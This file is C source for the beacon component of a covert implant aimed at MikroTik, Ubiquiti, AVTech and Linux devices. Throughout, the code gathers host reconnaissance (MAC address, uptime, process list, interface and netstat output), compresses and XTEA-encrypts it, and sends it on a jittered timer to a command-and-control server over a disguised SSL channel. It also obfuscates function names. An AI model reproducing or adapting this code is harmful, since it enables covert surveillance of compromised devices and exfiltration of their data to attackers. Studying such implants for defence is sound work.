#include <stdio.h>

#include "polarssl/ssl.h"
#include "polarssl/havege.h"
#include "polarssl/xtea.h"
#include "crypto.h"
#include "beacon.h"
#include "survey_uptime.h"
#include "survey_mac.h"
#include "run_command.h"
#include "debug.h"
#include "threads.h"
#include "proj_strings.h"
#include "compat.h"
#include "self_delete.h"
#include "process_list.h"
#include "ifconfig.h"
#include "netstat_an.h"
#include "netstat_rn.h"
#include "compression.h"
#include "string_utils.h"
#include "dns_protocol.h"

#define Free(x)	if ( (x) != NULL ) free((x));
//******************************************************************
#if defined LINUX || defined SOLARIS
#include <pthread.h>
#endif

#ifdef DEBUG
#include "polarssl/net.h"
#endif

//******************************************************************
static int send_beacon_data(BEACONINFO * beaconinfo, unsigned long uptime, int next_beacon);
static void encrypt_data(unsigned char *src, int src_size, unsigned char *dest, unsigned char *key);
static int get_printable_mac(unsigned char *dest, unsigned char *src);
static unsigned int generate_random_bytes(unsigned char *buf, unsigned int size);
static void extract_key(unsigned char *buf, unsigned char *key);
static void embedSize(unsigned int size, unsigned char *buf);

//******************************************************************
//***************** Cross Platform functions ***********************
//******************************************************************

//Obfuscate function string "calc_jitter"
#define calc_jitter psrh4593fds

int calc_jitter(int baseTime, float jitterPercent)
{
	//Multiply the percentage by the baseTime to get the jitter range.
	int jitterRange = 0;

	jitterRange = baseTime * jitterPercent;
	if (jitterRange == 0)
		return 0;

	// Determine if the jitter will be positive or negative.
	if (rand() > RAND_MAX / 2) {
		return rand() % jitterRange;	//make it positive
	} else {
		return -(rand() % jitterRange);	//make it negative
	}
}

unsigned int generate_random_bytes(unsigned char *buf, unsigned int size)
{
	unsigned int i;

	for (i = 0; i < size; i++) {
		buf[i] = (unsigned char) (rand() % 255);
	}

	return 0;
}

void embedSize(unsigned int size, unsigned char *buf)
{
	unsigned int i;
	char sizeStr[30];
	unsigned char data[30];

	memset(sizeStr, 0, 30);
	memset(data, 0, 30);
	sprintf(sizeStr, "%u", size);

	data[0] = strlen(sizeStr) ^ XOR_KEY;

	for (i = 0; i < strlen(sizeStr) + 1; i++) {
		data[i + 1] = sizeStr[i] ^ XOR_KEY;
	}

	memcpy(buf, data, strlen(sizeStr) + 1);
}

int beacon_start(BEACONINFO *beaconInfo)
{
	int numTries = 0;

	while (numTries != 5) {
		if (GetMacAddr(beaconInfo->macAddr) != SUCCESS) {
			numTries++;
			if (numTries == 5) {
				DLX(1, printf("ERROR: failed to pull MAC address\n"));
				return FAILURE;
			}
		} else {
			break;
		}
		sleep(60);	// Sleep for 1 minute
	}
	if (make_thread(beacon, (void *) beaconInfo) != SUCCESS) {
		DLX(1, printf(" ERROR: failed to create beacon thread\n"));
		return FAILURE;
	}

	return SUCCESS;
}

void *beacon(void *param)
{
	unsigned long secondsUp = 0;
	int beaconInterval = 0;
	int jitter = 0;
	int i;
	struct in_addr	beaconIPaddr;
	BEACONINFO *beaconInfo;

	beaconInfo = (BEACONINFO *) param;
	DLX(4, printf("\nStarting beacon with the following parameters:\n"));
	DLX(4, printf("\t%32s: %-s\n", "Beacon Server", beaconInfo->host));
	DLX(4, printf("\t%32s: %-d\n", "Beacon Server Port", beaconInfo->port));
	DLX(4, printf("\t%32s: %-s\n", "Primary DNS Server IP Address", beaconInfo->dns[0]));
	DLX(4, printf("\t%32s: %-s\n", "Secondary DNS Server IP Address", beaconInfo->dns[1]));
	DLX(4, printf("\t%32s: %-lu\n", "Initial Beacon Delay (sec)", beaconInfo->initDelay));
	DLX(4, printf("\t%32s: %-i\n", "Beacon Interval (sec)", beaconInfo->interval));
	DLX(4, printf("\t%32s: %-f\n\n", "Beacon Variance", beaconInfo->percentVariance));

	{	// Determine the initial beacon delay
		unsigned long initial_beacon_delay;

		initial_beacon_delay = beaconInfo->percentVariance > 0 ?
					beaconInfo->initDelay + calc_jitter(beaconInfo->initDelay, beaconInfo->percentVariance) : beaconInfo->initDelay;

		DLX(4, printf("\nStarting beacon thread with initial beacon delay of %ld seconds\n", initial_beacon_delay));
		sleep(initial_beacon_delay);
	}

	for (;;) {		// Beacon Loop
		secondsUp = GetSystemUpTime(); // Get system uptime
		DLX(4, printf("\tSystem uptime is %ld\n", secondsUp));

		if (beaconInfo->percentVariance > 0) {
			DLX(4, printf("Variance = %f\n", beaconInfo->percentVariance));
			jitter = calc_jitter(beaconInfo->interval, beaconInfo->percentVariance);	// Get jitter and calculate new interval
			DLX(4, printf("Jitter = %d\n", jitter));
			beaconInterval = beaconInfo->interval + jitter;
			DLX(4, printf("Beacon Interval = %d\n", beaconInterval));
		} else {
			beaconInterval = beaconInfo->interval;
		}

		// Resolve beacon IP address
		if (inet_pton(AF_INET, beaconInfo->host, &beaconIPaddr) <= 0) {		// Determine if beacon host is a name or dotted-quad address
			for (i = 0; i < 2; i++) {
				if (strlen(beaconInfo->dns[i]))
					DLX(4, printf("\tPerforming DNS lookup for %s using DNS server at %s.\n", beaconInfo->host, beaconInfo->dns[i]));
					if ( (beaconInfo->ip = dns_resolv(beaconInfo->host, beaconInfo->dns[i])) )
						break;
			}
			if (beaconInfo->ip == NULL) {
				DLX(4, printf("\tBeacon host could not be resolved.\n"));
				goto sleep;		// Try again next beacon interval
			} else {
				DLX(4, printf("\tBeacon IP resolved to: %s\n", beaconInfo->ip));
			}
		} else
			beaconInfo->ip = strdup(beaconInfo->host);		// IF beaconInfo-> host was an IP address, clone it (so it can be freed later)

		// TODO: SendBeaconData does not handle errors returned
		DLX(4, printf("\tSending beacon\n"));
		if (send_beacon_data(beaconInfo, secondsUp, beaconInterval) == SUCCESS) {
			update_file((char *) sdcfp);
		} else {
			DLX(4, printf("\tSend of beacon failed\n"));
		}
		Free(beaconInfo->ip);

	sleep:
		DLX(4, printf("\tSending next beacon in %d seconds.\n", beaconInterval));
		sleep(beaconInterval);	// Sleep for the length of the interval

	}

	return (void *) NULL;
}

#include <stdlib.h>
//******************************************************************
static int send_beacon_data(BEACONINFO * beaconInfo, unsigned long uptime, int next_beacon)
{
	int sock = 0;
	int retval = 0;
	int size = 0;
	int defaultBufSize = 3000;
	unsigned int packetSize = 0;
	unsigned int compressedPacketSize = 0;
	int encrypt_size = 0;
	int bytes_sent = 0;
	int sz_to_send = 0;
	int recv_sz = 0;
	char temp[1024];
	char recv_buf[30];
	//unsigned char*        cmd_str = NULL;
	unsigned char *enc_buf = NULL;
	unsigned char *packet = NULL;
	unsigned char *compressed_packet = NULL;
	unsigned char *ptr = NULL;
	unsigned char randData[64];
	unsigned char key[16];

	//beacon packet structs
	BEACON_HDR bhdr;
	ADD_HDR mac_hdr;
	ADD_HDR uptime_hdr;
	ADD_HDR proc_list_hdr;
	ADD_HDR ipconfig_hdr;
	ADD_HDR netstat_rn_hdr;
	ADD_HDR netstat_an_hdr;
	ADD_HDR next_beacon_hdr;
	ADD_HDR end_hdr;

	//beacon packet sizes. (used for memcpy)
	unsigned short mac_len = 0;
	unsigned short uptime_len = 0;
	unsigned short proc_list_len = 0;
	unsigned short ipconfig_len = 0;
	unsigned short netstat_rn_len = 0;
	unsigned short netstat_an_len = 0;
	unsigned short next_beacon_len = 0;

	//beacon data strings
	unsigned char *mac_data = NULL;
	unsigned char *uptime_data = NULL;
	unsigned char *proc_list_data = NULL;
	unsigned char *ipconfig_data = NULL;
	unsigned char *netstat_rn_data = NULL;
	unsigned char *netstat_an_data = NULL;
	unsigned char *next_beacon_data = NULL;

	crypt_context *beacon_io = NULL;	// Command and control I/O connection context

	memset(temp, 0, 1024);

	//Populate Beacon Header
	bhdr.os = BH_UNDEFINED;

#if defined AVTECH_ARM
	bhdr.os = BH_AVTECH_ARM;

#elif defined MIKROTIK
#if defined _PPC
	bhdr.os = BH_MIKROTIK_PPC;
#elif defined _MIPS
	bhdr.os = BH_MIKROTIK_MIPS;
#elif defined _MIPSEL
	bhdr.os = BH_MIKROTIK_MIPSEL;
#elif defined _X86
	bhdr.os = BH_MIKROTIK_X86;
#endif

#elif (defined LINUX) && (!defined UBIQUITI)
#if defined _X86
	bhdr.os = BH_LINUX_X86;
#elif defined _X86_64
	bhdr.os = BH_LINUX_X86_64;
#endif

#elif defined UBIQUITI
	bhdr.os = BH_UBIQUITI_MIPS;

#else
#error "ARCHITECTURE NOT DEFINED"
#endif

	bhdr.version = BEACON_HEADER_VERSION;
	DLX(4, printf("\tBEACON HEADER: version: %i, os: %i\n", bhdr.version, bhdr.os));
	DLX(4, printf("\tBEACON DATA CHECK: IP: %s, Port: %d\n", beaconInfo->ip, beaconInfo->port));
	bhdr.version = htons(BEACON_HEADER_VERSION);	//TODO: Change this number whenever the version changes.
	bhdr.os = htons(bhdr.os);	// Convert for network byte order

	//Populate Additional Headers
	// MAC address
	mac_hdr.type = htons(MAC);
	mac_data = (unsigned char *) malloc(MAC_ADDR_LEN_FORMATTED);
	if (mac_data != NULL) {
		memset(mac_data, 0, MAC_ADDR_LEN_FORMATTED);
		get_printable_mac(mac_data, beaconInfo->macAddr);
	}
	mac_len = strlen((char *) mac_data);
	mac_hdr.length = htons(mac_len);

	// Uptime
	uptime_hdr.type = htons(UPTIME);
	memset(temp, 0, 1024);
	sprintf(temp, "%lu", uptime);
	uptime_len = strlen(temp) + 1;
	uptime_hdr.length = htons(uptime_len);

	uptime_data = (unsigned char *) malloc(uptime_len);
	if (uptime_data != NULL) {
		memset(uptime_data, 0, uptime_len);
		memcpy(uptime_data, temp, uptime_len);
	}
	// Next-beacon time in seconds
	next_beacon_hdr.type = htons(NEXT_BEACON_TIME);
	memset(temp, 0, 1024);
	sprintf(temp, "%d", next_beacon);

	next_beacon_len = strlen(temp);
	next_beacon_hdr.length = htons(next_beacon_len);

	next_beacon_data = (unsigned char *) malloc(next_beacon_len);
	if (next_beacon_data != NULL) {
		memset(next_beacon_data, 0, next_beacon_len);
		memcpy(next_beacon_data, temp, next_beacon_len);
	}
	// Process list
	proc_list_hdr.type = htons(PROCESS_LIST);
//TODO: check malloc() return value
	proc_list_data = get_process_list(&size);
	if (proc_list_data == NULL) {
		proc_list_len = 0;
	} else {
		proc_list_len = size;
	}
	proc_list_hdr.length = htons(proc_list_len);

	size = defaultBufSize;

	//ipconfig 
	ipconfig_hdr.type = htons(IPCONFIG);
	ipconfig_data = get_ifconfig(&size);
	if (ipconfig_data == NULL) {
		ipconfig_len = 0;
	} else {
		ipconfig_len = size;
	}

	ipconfig_hdr.length = htons(ipconfig_len);

	size = defaultBufSize;

	//netstat -rn

	netstat_rn_hdr.type = htons(NETSTAT_RN);
	netstat_rn_data = get_netstat_rn(&size);
	if (netstat_rn_data == NULL) {
		netstat_rn_len = 0;
	} else {
		netstat_rn_len = size;
	}
	netstat_rn_hdr.length = htons(netstat_rn_len);
	size = defaultBufSize;

	//netstat -an
	netstat_an_hdr.type = htons(NETSTAT_AN);
	netstat_an_data = get_netstat_an(&size);
	if (netstat_an_data == NULL) {
		netstat_an_len = 0;
	} else {
		netstat_an_len = size;
	}
	netstat_an_hdr.length = htons(netstat_an_len);
	size = defaultBufSize;

	end_hdr.type = htons(0);
	end_hdr.length = htons(0);
	//MessageBox(NULL,"Got Beacon Data!","OKAY",MB_OK);

	//create packet
	//size is equal to the size of a beacon header + the size of 6 additional headers (one of which
	// is the ending header) + the size of all the data fields.
	packetSize = (sizeof(ADD_HDR) * 8) + mac_len + uptime_len +
		proc_list_len + ipconfig_len + netstat_rn_len + netstat_an_len + next_beacon_len;

	packet = (unsigned char *) malloc(packetSize);
	if (packet == NULL) {
		DLX(1, printf("Not enough memory to allocate packet!"));
		goto EXIT;
	}
	memset(packet, 0, packetSize);
	ptr = packet;

	//copy in mac hdr
	memcpy(ptr, (unsigned char *) &mac_hdr, sizeof(mac_hdr));
	ptr += sizeof(ADD_HDR);
	//copy in mac addr
	memcpy(ptr, mac_data, mac_len);
	ptr += mac_len;
	//copy in uptime hdr
	memcpy(ptr, (unsigned char *) &uptime_hdr, sizeof(uptime_hdr));
	ptr += sizeof(ADD_HDR);
	//copy in uptime data
	memcpy(ptr, uptime_data, uptime_len);
	ptr += uptime_len;
	//copy in next beacon hdr
	memcpy(ptr, (unsigned char *) &next_beacon_hdr, sizeof(next_beacon_hdr));
	ptr += sizeof(ADD_HDR);
	//copy in next beacon data
	memcpy(ptr, next_beacon_data, next_beacon_len);
	ptr += next_beacon_len;
	//copy in process list hdr
	if (proc_list_data != NULL) {
		memcpy(ptr, (unsigned char *) &proc_list_hdr, sizeof(proc_list_hdr));
		ptr += sizeof(ADD_HDR);
		//copy in process list
		memcpy(ptr, proc_list_data, proc_list_len);
		ptr += proc_list_len;
	}
	//copy in ipconfig hdr
	if (ipconfig_data != NULL) {
		memcpy(ptr, (unsigned char *) &ipconfig_hdr, sizeof(ipconfig_hdr));
		ptr += sizeof(ADD_HDR);
		//copy in ipconfig data
		memcpy(ptr, ipconfig_data, ipconfig_len);
		ptr += ipconfig_len;
	}
	//copy in netstat hdr
	if (netstat_rn_data != NULL) {
		memcpy(ptr, (unsigned char *) &netstat_rn_hdr, sizeof(netstat_rn_hdr));
		ptr += sizeof(ADD_HDR);
		//copy in netstat data
		memcpy(ptr, netstat_rn_data, netstat_rn_len);
		ptr += netstat_rn_len;
	}
	//copy in netstat hdr
	if (netstat_an_data != NULL) {
		memcpy(ptr, (unsigned char *) &netstat_an_hdr, sizeof(netstat_an_hdr));
		ptr += sizeof(ADD_HDR);
		//copy in netstat data
		memcpy(ptr, netstat_an_data, netstat_an_len);
		ptr += netstat_an_len;
	}
	//add closing header
	memcpy(ptr, (unsigned char *) &end_hdr, sizeof(end_hdr));

	ptr = NULL;

	//compress packet
	compressed_packet = compress_packet(packet, packetSize, &compressedPacketSize);
	DLX(5, printf("Original packet size: %d, Compressed packet size: %d\n", packetSize, compressedPacketSize));
	//combine compressed_packet with beacon header.

	Free(packet);


	packetSize = sizeof(BEACON_HDR) + compressedPacketSize;
	packet = (unsigned char *) malloc(packetSize);
	if (packet == NULL) {
		goto EXIT;
	}

	memset(packet, 0, packetSize);													// Zero out buffer
	memcpy(packet, &bhdr, sizeof(BEACON_HDR));										// Copy-in beacon header
	memcpy(packet + sizeof(BEACON_HDR), compressed_packet, compressedPacketSize);	// Copy-in compressed data
	encrypt_size = packetSize + (8 - (packetSize % 8));								// Calculate encryption buffer size

	//connect to the client
	DLX(4, printf("\tAttempting connection to client %s on port %d...\n", beaconInfo->ip, beaconInfo->port));
	retval = net_connect(&sock, beaconInfo->ip, beaconInfo->port);
	if (retval != SUCCESS) {
		DLX(1, printf("\tERROR: net_connect(): "); if (retval == POLARSSL_ERR_NET_CONNECT_FAILED) {
			printf("NET_CONNECT_FAILED\n");}
			else
			if (retval == POLARSSL_ERR_NET_SOCKET_FAILED) {
			printf("NET_SOCKET_FAILED\n");}
			else
			if (retval == POLARSSL_ERR_NET_UNKNOWN_HOST) {
			printf("NET_UNKNOWN_HOST\n");}
			else {
			printf("Unknown error\n");}
		);

		// we can return from here. no need to goto to bottom of function because
		// at this stage, there is nothing to clean-up
		// return FAILURE;
		// Don't think that is true you have allocated all of your beacon info
		// however it just couldn't connect out; lets clean up.
		retval = FAILURE;
		goto EXIT;
	}
	//setup ssl
	DLX(4, printf("\tConnection successful, setup crypto\n"));
	if ((beacon_io = crypt_setup_client(&sock)) == NULL) {
		DLX(4, printf("\tERROR: crypt_setup_client()\n"));
		retval = FAILURE;
		goto EXIT;
	}
	//set swindle flag to true
	beacon_io->ssl->use_custom = 1;
	beacon_io->ssl->tool_id = TOOL_ID;
	beacon_io->ssl->xor_key = TOOL_ID_XOR_KEY;

	//perform an SSL handshake
	DLX(4, printf("\tPerform SSL handshake\n"));
	if (crypt_handshake(beacon_io) != SUCCESS) {
		DLX(2, printf("\tERROR: SSL connection with SSL server failed to initialize.\n"));
		retval = FAILURE;
		goto EXIT;
	}

	DLX(4, printf("\tHandshake Complete!\n"));

	beacon_io->ssl->do_crypt = 0;			//turn off the ssl encryption since we use our own
	generate_random_bytes(randData, 64);	//generate 32 random bytes
	embedSize(encrypt_size, randData);		//embed the data size so the server knows how much data to read

	DLX(4, printf("\tEncrypt_size is %d \n", encrypt_size));
	DLX(4, printf("\tSending the first 64 bytes with data size encoded in random data\n"));
	//send the bytes 
	if (crypt_write(beacon_io, randData, 64) < 0) {	//TODO: this is probably no the best check... maybe 32 > crypt_write
		retval = FAILURE;
		goto EXIT;
	}
	//receive the buffer
	memset(randData, 0, 64);
	retval = recv(sock, (char *) randData, 37, 0);
	if (retval < 0) {
		DLX(4, printf("\tReceive failed:"));
		perror("1");
		retval = FAILURE;
		goto EXIT;
	}
	DLX(4, printf("\tReceived %d bytes\n", retval));

	extract_key(randData + 5, key);		//extract the key

	//encrypt the beacon data with the extracted key
	//the buffer is padded so that it can be broken
	//up into 8 byte chunks
	enc_buf = (unsigned char *) malloc(encrypt_size);
	if (enc_buf == NULL) {
		DLX(1, printf("Could not allocate space for enc_buf"));
		goto EXIT;
	}
	memset(enc_buf, 0, encrypt_size);
	encrypt_data(packet, packetSize, enc_buf, key);

	//	Send the data until all data has been sent
	//	Size embedded in random data
	//	Send encrypted data
	do {

		// Embed the data size so the server knows how much data to read
		sz_to_send = (encrypt_size - bytes_sent) >= MAX_SSL_PACKET_SIZE ? MAX_SSL_PACKET_SIZE : encrypt_size - bytes_sent;
		DLX(6, printf("\tSending: %d bytes\n", sz_to_send));

		retval = crypt_write(beacon_io, enc_buf + bytes_sent, sz_to_send);
		if (retval < 0) {
			DLX(4, printf("crypt_write() failed: ");
				print_ssl_error(retval));
			retval = FAILURE;
			goto EXIT;
		}

		// Receive ACK
		memset(recv_buf, 0, 30);
		retval = recv(sock, recv_buf, 30, 0);
		if (retval < 0) {
			DLX(4, printf("\tReceive failed:"));
			perror("2");
			retval = FAILURE;
			goto EXIT;
		}
		if (retval == 0) {
			DLX(6, printf("\tPeer closed connection\n"));	// Not sure if this should be success or failure
			break;
		}
		DLX(6, printf("\tReceived %d bytes\n", retval));
		DPB(7, "Received buffer: ", (const unsigned char *)recv_buf, retval);
		DPB(7, "Received data: ", (const unsigned char *)(recv_buf + sizeof(SSL_HDR)), retval - (sizeof(SSL_HDR) ));

		recv_sz = atoi(recv_buf + (sizeof(SSL_HDR)));
		DLX(6, printf("\tACKed bytes: %d\n", recv_sz));
		bytes_sent += recv_sz;
		DLX(6, printf("\tTotal bytes sent: %d, %d to go\n", bytes_sent, encrypt_size - bytes_sent));
	} while (bytes_sent < encrypt_size);

	retval = SUCCESS;
	DLX(4, printf("BEACON SENT cleaning up\n"));

  EXIT:	// cleanup

	if (beacon_io)
		if (beacon_io->ssl->major_ver >= 1) {
			crypt_close_notify(beacon_io);
			crypt_cleanup(beacon_io);
		}

	Free(mac_data);
	Free(uptime_data);
	Free(next_beacon_data);
	Free(proc_list_data);
	Free(ipconfig_data);
	Free(netstat_rn_data);
	Free(netstat_an_data);
	Free(enc_buf);
	Free(packet);
	Free(compressed_packet);

	if (sock > 0)
		net_close(sock);

	return retval;
}

//******************************************************************

void encrypt_data(unsigned char *src, int src_size, unsigned char *dest, unsigned char *key)
{
	xtea_context xtea;
	int i, x;
	unsigned char *src_ptr;
	unsigned char *dest_ptr;
	unsigned char enc[8];
	unsigned char buf[8];

	//initialize the xtea encryption context
	xtea_setup(&xtea, key);

	i = 0;

	while (i < src_size) {
		src_ptr = src + i;
		dest_ptr = dest + i;
		if ((src_size - i) < 8) {
			for (x = 0; x < (src_size - i); ++x) {
				buf[x] = src_ptr[x];
			}
			memset(buf + (src_size - i), 0, (8 - (src_size - i)));
		} else {
			for (x = 0; x < 8; ++x) {
				buf[x] = src_ptr[x];
			}
		}

		xtea_crypt_ecb(&xtea, XTEA_ENCRYPT, buf, enc);

		memcpy(dest_ptr, enc, 8);
		i += 8;
	}
}


//******************************************************************
int get_printable_mac(unsigned char *dest, unsigned char *src)
{
	char buffer[18];
	memset(buffer, 0, 18);

	sprintf(buffer, "%.2x-%.2x-%.2x-%.2x-%.2x-%.2x", src[0], src[1], src[2], src[3], src[4], src[5]);

	memcpy(dest, buffer, 18);
	return 0;
}

//******************************************************************
void extract_key(unsigned char *buf, unsigned char *key)
{
	int offset;

	//calculate the offset so we know where to extract the key
	offset = (buf[0] ^ XOR_KEY) % 15;

	//extract the key
	memcpy(key, buf + offset + 1, 16);
}
